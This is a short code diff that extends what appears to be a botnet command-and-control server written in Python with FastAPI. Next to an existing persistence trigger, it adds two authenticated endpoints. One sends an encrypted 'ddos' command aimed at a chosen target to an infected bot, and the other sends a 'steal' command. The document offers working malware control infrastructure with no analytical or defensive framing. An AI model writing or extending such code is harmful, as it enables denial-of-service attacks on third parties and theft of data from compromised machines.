@@ -159,3 +159,17 @@ async def trigger_persistence(bot_id: str, user: str = Depends(get_current_user)
         await active_bots[bot_id].send_text(encrypt_message("persistence"))
         return {"status": "triggered"}
     return JSONResponse(content={"error": "Bot offline"}, status_code=404)
+
+@app.get("/ddos/{bot_id}")
+async def trigger_ddos(bot_id: str, target: str, user: str = Depends(get_current_user)):
+    if bot_id in active_bots:
+        await active_bots[bot_id].send_text(encrypt_message(f"ddos {target}"))
+        return {"status": "triggered"}
+    return JSONResponse(content={"error": "Bot offline"}, status_code=404)
+
+@app.get("/steal/{bot_id}")
+async def trigger_steal(bot_id: str, user: str = Depends(get_current_user)):
+    if bot_id in active_bots:
+        await active_bots[bot_id].send_text(encrypt_message("steal"))
+        return {"status": "triggered"}
+    return JSONResponse(content={"error": "Bot offline"}, status_code=404)
